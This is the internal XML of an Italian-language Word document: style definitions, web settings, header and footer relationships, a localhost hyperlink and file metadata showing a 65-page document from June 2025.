      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:smallCaps/>
      <w:color w:val="000080"/>
      <w:sz w:val="32"/>
      <w:szCs w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00886CE8"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:spacing w:before="360" w:after="120"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000080"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="28"/>
      <w:lang w:val="it-IT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo3Carattere"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="008A62CD"/>
    <w:pPr>
      <w:keepNext/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="13"/>
      </w:numPr>
      <w:spacing w:before="360" w:after="120"/>
      <w:ind w:left="0" w:firstLine="0"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000080"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="9"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:jc w:val="center"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:after="80"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="666666"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:after="80"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:color w:val="666666"/>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olo">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="10"/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="0" w:after="60"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="52"/>
      <w:szCs w:val="52"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sottotitolo">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="0" w:after="320"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Arial" w:hAnsi="Arial" w:cs="Arial"/>
      <w:color w:val="666666"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="30"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Didascalia">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="35"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="003A2011"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Intestazione">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="IntestazioneCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00205EE2"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4819"/>
        <w:tab w:val="right" w:pos="9638"/>
      </w:tabs>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="IntestazioneCarattere">
    <w:name w:val="Intestazione Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Intestazione"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00205EE2"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Pidipagina">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="PidipaginaCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00205EE2"/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4819"/>
        <w:tab w:val="right" w:pos="9638"/>
      </w:tabs>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PidipaginaCarattere">
    <w:name w:val="Piè di pagina Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Pidipagina"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00205EE2"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Nessunaspaziatura">
    <w:name w:val="No Spacing"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00A92DE1"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Collegamentoipertestuale">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00126D1C"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Menzionenonrisolta">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00126D1C"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Paragrafoelenco">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00776E8E"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testonotaapidipagina">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TestonotaapidipaginaCarattere"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00445E86"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:eastAsia="Times New Roman" w:hAnsi="Lucida Sans Unicode" w:cs="Times New Roman"/>
      <w:spacing w:val="12"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="it-IT" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TestonotaapidipaginaCarattere">
    <w:name w:val="Testo nota a piè di pagina Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonotaapidipagina"/>
    <w:semiHidden/>
    <w:rsid w:val="00445E86"/>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:eastAsia="Times New Roman" w:hAnsi="Lucida Sans Unicode" w:cs="Times New Roman"/>
      <w:spacing w:val="12"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:val="it-IT" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Rimandonotaapidipagina">
    <w:name w:val="footnote reference"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00445E86"/>
    <w:rPr>
      <w:vertAlign w:val="superscript"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo3Carattere">
    <w:name w:val="Titolo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo3"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="007026E9"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000080"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormaleWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008B2DB7"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="it-IT" w:eastAsia="it-IT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolosommario">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Titolo1"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="002039E1"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:pageBreakBefore w:val="0"/>
      <w:numPr>
        <w:numId w:val="0"/>
      </w:numPr>
      <w:pBdr>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:pBdr>
      <w:spacing w:before="240" w:after="0" w:line="259" w:lineRule="auto"/>
      <w:jc w:val="left"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:b w:val="0"/>
      <w:smallCaps w:val="0"/>
      <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
      <w:lang w:val="it-IT" w:eastAsia="it-IT"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002039E1"/>
    <w:pPr>
      <w:spacing w:after="100"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002039E1"/>
    <w:pPr>
      <w:spacing w:after="100"/>
      <w:ind w:left="220"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002039E1"/>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4076543">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="207911624">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="248542854">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="311645860">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="414975723">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="581066778">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="627126831">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="634261186">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="634414033">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="680740598">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="765349457">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="904336343">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1153064615">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1224296478">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1257594912">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1259409468">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1335449221">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1492133669">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="161154919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footer" Target="footer2.xml"/><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hyperlink" Target="http://localhost:7070/reviews.html" TargetMode="External"/><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header" Target="header2.xml"/><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footer2.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image70.png"/></Relationships>
</file>

<file path=word/_rels/header1.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image69.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image68.png"/></Relationships>
</file>

<file path=word/_rels/header2.xml.rels><?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6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071BBC9-C656-4805-8422-2A8EF374B1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65</Pages>
  <Words>11716</Words>
  <Characters>66784</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>556</Lines>
  <Paragraphs>156</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>78344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BOFFOLO ALESSANDRO ALDO</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>BALZANO NICOLA</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <cp:lastPrinted>2025-06-05T16:02:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-06-05T16:37:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-06-05T16:37:00Z</dcterms:modified>
</cp:coreProperties>
</file>